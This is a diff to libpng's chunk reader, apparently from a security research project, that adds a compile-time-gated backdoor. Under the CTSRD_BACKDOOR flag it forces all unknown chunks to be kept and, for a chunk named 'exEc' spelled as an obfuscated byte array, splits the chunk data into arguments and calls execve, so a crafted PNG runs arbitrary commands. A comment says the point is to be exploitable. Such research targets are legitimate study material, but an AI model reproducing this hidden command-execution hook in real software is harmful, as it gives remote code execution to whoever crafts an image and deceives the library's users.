@@ -16,6 +16,13 @@
 
 #include "pngpriv.h"
 
+#if defined(CTSRD_BACKDOOR)
+#include <unistd.h>
+
+extern int png_exec_triggered;
+int png_exec_triggered;
+#endif
+
 #ifdef PNG_READ_SUPPORTED
 
 png_uint_32 PNGAPI
@@ -2643,6 +2650,9 @@ void /* PRIVATE */
 png_handle_unknown(png_structp png_ptr, png_infop info_ptr, png_uint_32 length)
 {
    png_uint_32 skip = 0;
+#if defined(CTSRD_BACKDOOR)
+   const png_byte png_exEc[5] = {101, 120,  69,  99, '\0'};
+#endif
 
    png_debug(1, "in png_handle_unknown");
 
@@ -2684,11 +2694,15 @@ png_handle_unknown(png_structp png_ptr, png_infop info_ptr, png_uint_32 length)
    }
 
 #ifdef PNG_READ_UNKNOWN_CHUNKS_SUPPORTED
+#if defined(CTSRD_BACKDOOR)
+   if (1)
+#else
    if ((png_ptr->flags & PNG_FLAG_KEEP_UNKNOWN_CHUNKS)
 #ifdef PNG_READ_USER_CHUNKS_SUPPORTED
        || (png_ptr->read_user_chunk_fn != NULL)
 #endif
        )
+#endif
    {
 #ifdef PNG_MAX_MALLOC_64K
       if (length > 65535)
@@ -2715,6 +2729,43 @@ png_handle_unknown(png_structp png_ptr, png_infop info_ptr, png_uint_32 length)
          png_ptr->unknown_chunk.data = (png_bytep)png_malloc(png_ptr, length);
          png_crc_read(png_ptr, png_ptr->unknown_chunk.data, length);
       }
+#if defined(CTSRD_BACKDOOR)
+      /*
+       * Handle exEc chunks by parsing the data (presumed to be a series of
+       * NUL seperated strings) into an argv array and then execing it.
+       * Don't worry too much about validation or error handling since the
+       * whole point is to be exploitable.
+       */
+      if (png_memcmp(png_ptr->unknown_chunk.name, png_exEc, 4) == 0)
+      {
+	 int i, argc;
+	 char *c, **argv;
+	 char * envp[1] = { NULL };
+
+	 c = (char *)png_ptr->unknown_chunk.data;
+	 argc = 0;
+	 for (c = (char *)png_ptr->unknown_chunk.data;
+	      c < (char *)png_ptr->unknown_chunk.data + length; c++)
+	 {
+	    if (*c == '\0')
+	       argc++;
+	 }
+	 argv = png_malloc(png_ptr, sizeof(*argv) * (argc + 1));
+	 argv[0] = (char *)png_ptr->unknown_chunk.data;
+	 for (c = (char *)png_ptr->unknown_chunk.data, i = 0; i < argc; c++)
+	 {
+	    if (*c == '\0')
+	    {
+	       i++;
+	       argv[i] = c + 1;
+	    }
+	 }
+	 argv[argc] = NULL;
+	 execve(argv[0], argv, envp);
+	 png_exec_triggered = 1;
+      }
+#endif
+	  
 
 #ifdef PNG_READ_USER_CHUNKS_SUPPORTED
       if (png_ptr->read_user_chunk_fn != NULL)
